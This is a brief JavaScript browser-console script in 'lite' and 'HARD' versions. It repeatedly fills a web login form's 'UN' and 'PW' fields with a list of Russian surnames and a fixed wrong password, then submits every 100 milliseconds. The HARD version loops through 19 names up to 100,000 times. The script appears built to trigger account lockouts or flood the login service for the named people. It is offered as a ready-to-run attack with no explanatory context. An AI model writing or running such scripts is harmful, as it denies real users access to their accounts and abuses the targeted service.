// lite
var array = ["Аплин","ДругаяФамилия"];
function run(){
    var x = 0;
    var n = 0;
    var interval = setInterval(function() {
      document.getElementsByName('UN')[0].value = array[x];
      document.getElementsByName('PW')[0].value = "рандомныйпароль"
      login_ctrl.login();
      if (x > 3) {
        return clearInterval(interval);
      }
      n++;
      if(n <= 3){
        n++;
      }else{
        x++;
        n = 0;
      }
    }, 100);
}
run();


// HARD
var array = ["Аплин","Симонов","Фатеева","Анисимова","Богданов","Беляева","Картавых","Братчикова","Латыпов","Малышков","Толстошеев","Носарева","Рогозин","Рахлевский","Белькевич","Селявский","Будунов","Шестакова", "Дубская"];
function run(){
    var x = 0;
    var n = 0;
    var interval = setInterval(function() {
      document.getElementsByName('UN')[0].value = array[x];
      document.getElementsByName('PW')[0].value = "рандомныйпароль"
      login_ctrl.login();
      if (x >= 100000) {
        return clearInterval(interval);
      }
      n++;
      if(n <= 4){
        n++;
      }else{
        x++;
        n = 0;
      }
      if(x == 18){
        x = 0;
      }
    }, 100);
}
run();

